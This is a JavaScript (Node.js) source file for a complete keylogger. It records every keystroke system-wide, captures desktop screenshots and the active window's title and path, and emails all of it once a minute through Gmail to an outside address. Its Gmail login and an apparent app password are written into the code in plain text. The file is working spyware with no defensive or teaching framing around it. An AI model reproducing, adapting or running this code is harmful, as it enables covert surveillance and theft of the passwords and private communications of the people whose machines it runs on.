var GlobalKeyboardListener = require("node-global-key-listener").GlobalKeyboardListener;
var nodemailer = require('nodemailer');
const util = require('util');
const screenshot = require('screenshot-desktop');
const activeWindow = require('active-win');
const { writeFileSync, unlinkSync } = require("fs");
const v = new GlobalKeyboardListener();
const options = {};
var transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 't3sterrrr@gmail.com',
    pass: 'kgrx lsqp gefc qogv'
  }
});

let userTyped = '';

v.addListener(function (e) {
    if (e.state == "DOWN") {
      if (e.name == "a" || e.name == "b" || e.name == "c" || e.name == "d" || e.name == "e" ||
      e.name == "f" || e.name == "g" || e.name == "h" || e.name == "i" || e.name == "j" ||
      e.name == "k" || e.name == "l" || e.name == "m" || e.name == "n" || e.name == "o" ||
      e.name == "p" || e.name == "q" || e.name == "r" || e.name == "s" || e.name == "t" ||
      e.name == "u" || e.name == "v" || e.name == "w" || e.name == "x" || e.name == "y" ||
      e.name == "z" || e.name == "A" || e.name == "B" || e.name == "C" || e.name == "D" ||
      e.name == "E" || e.name == "F" || e.name == "G" || e.name == "H" || e.name == "I" ||
      e.name == "J" || e.name == "K" || e.name == "L" || e.name == "M" || e.name == "N" ||
      e.name == "O" || e.name == "P" || e.name == "Q" || e.name == "R" || e.name == "S" ||
      e.name == "T" || e.name == "U" || e.name == "V" || e.name == "W" || e.name == "X" ||
      e.name == "Y" || e.name == "Z" || e.name == "0" || e.name == "1" || e.name == "2" ||
      e.name == "3" || e.name == "4" || e.name == "5" || e.name == "6" || e.name == "7" ||
      e.name == "8" || e.name == "9"){
        userTyped += (`${e.name}`);
        process.stdout.write(`${e.name}`);
      }
      else if (e.state == "DOWN" && e.name == "SPACE"){
        userTyped += (` `);
        process.stdout.write(` `);    
      }
      else if (e.name == "DOT"){ 
        userTyped += (`.`);
        process.stdout.write(`.`);  
      }
      else if (e.name == "LEFT ALT" || e.name == "RIGHT ALT" || e.name == "LEFT SHIFT" || 
      e.name == "RIGHT SHIFT" || e.name == "LEFT CTRL" || e.name == "RIGHT CTRL"){ 
        userTyped += (` <DOWN ${e.name}> `);      
        process.stdout.write(` <DOWN ${e.name}> `);        
      }
      else{   
        userTyped += (` <${e.name}> `);  
        process.stdout.write(` <${e.name}> `);       
      }
    }
    else if (e.state == "UP" &&
    e.name == "LEFT ALT" || e.name == "RIGHT ALT" || e.name == "LEFT SHIFT" || 
    e.name == "RIGHT SHIFT" || e.name == "LEFT CTRL" || e.name == "RIGHT CTRL"){ 
      userTyped += (` <UP ${e.name}> `);   
      process.stdout.write(` <UP ${e.name}> `);          
    };
});

const promptActWin = async () => {
	const actWin = await activeWindow(options);
  return `Title: ${actWin.title} \nOwner: ${actWin.owner.name}, ${actWin.owner.path}`;
};

writeFileSync("screenshot.png", '')

const emailSender = async () => {
  
  screenshot().then((img) => {
    writeFileSync("screenshot.png", img)
  })

  const actWinInfo = await promptActWin();

  var mailOptions = {
    from: 't3sterrrr@gmail.com',
    to: 'niorsayson@gmail.com',
    subject: 'Hack ka sa\'kin',
    html: `<p>${actWinInfo}</p>\n<p>${userTyped}</p>`,
    attachments: [
        {
            filename: 'screenshot.png',
            path: __dirname + '/screenshot.png'
        }
    ]
  };

  transporter.sendMail(mailOptions, function(error, info){
    if (error) {
      console.log(error);
    } else {
      //print after sending the Keylogs, Windows Info, and Screenshot in email
      console.log('\nKeylogs, Windows Info, and Screenshot has been sent: ' + info.response);
      //it will remove the screenshot file to the directory after sending it in email
      unlinkSync('screenshot.png')
    }
  });
  
  //clear the userTyped after sending in email.
  userTyped = '';
};
//Keylogs, Windows Info, and Screenshot will be sent every 1 minute
setInterval(emailSender, 1000 * 60);